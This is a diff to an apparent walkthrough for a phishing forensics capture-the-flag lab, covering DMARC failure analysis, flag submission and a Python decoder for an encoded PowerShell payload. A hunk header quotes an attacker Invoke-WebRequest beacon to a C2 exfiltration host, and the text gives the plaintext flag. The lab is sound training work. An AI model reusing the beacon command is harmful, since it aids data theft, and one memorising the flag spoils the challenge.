@@ -46,6 +46,7 @@ Follow these sequential steps in the interactive Marimo DFIR Console:
 4. **Analyze Authentication Failure**:
    - Notice that `quickbooks-invoicing-update.com` is a typosquatting domain impersonating QuickBooks.
    - Because the sender IP `203.0.113.88` is not authorized by the legitimate SPF record and the cryptographic DKIM signature failed verification, DMARC evaluated to `fail`.
+   - _Key Analyst Insight_: A properly configured mail gateway set to `p=reject` would have quarantined this email at the perimeter.
 
 ---
 
@@ -122,16 +123,13 @@ Invoke-WebRequest http://c2-exfil-node.darknet-routing.org/beacon -Header @{Key=
 
 ### Step 5: Case Verification & Submission (Tab: `🏁 Case Verification & IOCs`)
 
-1. **Verify the Flag**:
-   - In **Step 5: Verify Incident Flag & IOCs**, enter:
 1. **Verify the Flag in the Notebook**:
-   - In **Step 5: Verify Incident Flag & Threat Intel Report**, enter:
+   - In **Step 5: Incident Verification & DFIR Case Closure**, enter:
      `FLAG{dmarc_fail_invoice_c2_domain_detected}`
    - The workbench validates the candidate flag using one-way cryptographic SHA-256 verification (`5f458b9db61a55c7839ede55b271e293e24fee62fe40cb384d55445b9b5666ae`), ensuring no plaintext answers can be inspected in the notebook code.
    - Confirm the green success banner: `🎉 FLAG VERIFIED CORRECT!`.
    - Upon correct verification, the confirmed **Threat Intelligence Indicators (IOCs)** report unlocks below the input box.
 2. **Submit to Portal**:
-   - Copy `FLAG{dmarc_fail_invoice_c2_domain_detected}` into the CyberLab challenge submission box to claim 100 points.
    - Copy `FLAG{dmarc_fail_invoice_c2_domain_detected}` into the CyberLab challenge submission box in the left portal pane to claim your 100 points and register your Phishing DFIR competency.
 
 ---
@@ -164,7 +162,7 @@ for part in msg.iter_attachments():
     b64_match = re.search(r"-enc\s+([A-Za-z0-9+/=]+)", content)
     if b64_match:
         raw_b64 = b64_match.group(1)
-        decoded = base64.b64decode(raw_b64).decode("utf-8", errors="ignore")
+        decoded = base64.b64decode(raw_b64).decode("utf-16le", errors="ignore")
         print(f"[!] Decoded PowerShell Payload:\n{decoded}")
 ```
 
